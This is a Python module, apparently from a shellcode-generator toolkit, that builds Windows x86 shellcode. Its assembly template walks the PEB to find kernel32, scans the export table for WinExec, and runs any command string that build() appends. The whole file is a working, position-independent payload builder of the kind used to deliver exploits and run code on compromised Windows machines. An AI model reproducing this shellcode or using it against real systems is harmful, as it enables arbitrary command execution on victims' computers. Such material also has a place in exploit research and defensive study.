"""Windows x86 — WinExec(cmd, SW_SHOWNORMAL) via PEB walk + export table scan.

Technique mirrors win_x64.py but uses FS:[0x30] for the PEB and x86
stdcall convention (push args right-to-left; WinExec cleans its own stack).

PEB_LDR_DATA offsets (x86):
  Ldr          = PEB + 0x0c
  InMemOrdList = Ldr + 0x14
LDR_DATA_TABLE_ENTRY (from InMemoryOrderLinks ptr):
  DllBase      = entry + 0x10
PE32 export directory:
  ExportDir    = NT_hdrs + 0x78
"""
from __future__ import annotations

from .._asm import assemble
from . import register

_TEMPLATE = """\
cld
push ebx
push esi
push edi
push ebp

mov ebx, fs:[0x30]
mov ebx, [ebx + 0x0c]
mov ebx, [ebx + 0x14]
mov ebx, [ebx]
mov ebx, [ebx]
mov edi, [ebx + 0x10]

mov eax, [edi + 0x3c]
add eax, edi
mov eax, [eax + 0x78]
test eax, eax
jz done
add eax, edi
mov esi, eax

xor ecx, ecx
mov ecx, [esi + 0x18]

search:
dec ecx
js done
mov eax, [esi + 0x20]
add eax, edi
mov eax, [eax + ecx * 4]
add eax, edi
cmp dword ptr [eax], 0x456e6957
jne search
cmp dword ptr [eax + 4], 0x00636578
jne search

mov eax, [esi + 0x24]
add eax, edi
movzx eax, word ptr [eax + ecx * 2]
mov ebx, [esi + 0x1c]
add ebx, edi
mov eax, [ebx + eax * 4]
add eax, edi
mov ebp, eax

jmp get_str

cmd_exec:
pop eax
push 1
push eax
call ebp

done:
pop ebp
pop edi
pop esi
pop ebx
ret

get_str:
call cmd_exec
"""


@register("windows", "x86")
def build(cmd: str) -> bytes:
    """Assemble Windows x86 WinExec shellcode for the given command string."""
    code = assemble(_TEMPLATE, arch="x86", mode="32")
    return code + cmd.encode("latin-1") + b"\x00"
